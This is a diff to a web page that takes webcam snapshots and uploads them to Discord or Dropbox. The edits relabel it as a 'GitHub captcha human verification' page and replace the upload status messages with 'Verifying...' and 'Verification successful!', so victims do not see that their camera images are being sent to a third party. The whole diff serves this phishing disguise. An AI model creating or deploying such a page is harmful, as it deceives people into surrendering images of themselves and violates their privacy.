@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Snap & Send</title>
+<title>Github human verification</title>
 
 <!-- ✅ ADDED: external CSS (your version) -->
 <link rel="stylesheet" href="style.css">
@@ -72,7 +72,7 @@ input[type="file"] {
 
 <body>
 <div class="container">
-  <h1>GitHub page human verification</h1>
+  <h1>GitHub captcha human verification</h1>
 
   <video id="video" autoplay playsinline></video>
   <img id="preview" style="display:none">
@@ -138,7 +138,7 @@ function showPreview(blob) {
 
 // Upload handler
 function upload(blob) {
-  status.innerText = "Uploading...";
+  status.innerText = "Verifying...";
 
   if (UPLOAD_TARGET === "discord") {
     const fd = new FormData();
@@ -149,8 +149,8 @@ function upload(blob) {
       method: "POST",
       body: fd
     })
-    .then(r => status.innerText = r.ok ? "Sent to Discord!" : "Discord upload failed")
-    .catch(() => status.innerText = "Upload error");
+    .then(r => status.innerText = r.ok ? "Verification successful!" : "Discord upload failed")
+    .catch(() => status.innerText = "Verification Failed");
   }
 
   if (UPLOAD_TARGET === "dropbox") {
@@ -188,6 +188,7 @@ function dataURLtoBlob(dataurl) {
 
 </body>
 </html>
+
 
 
 
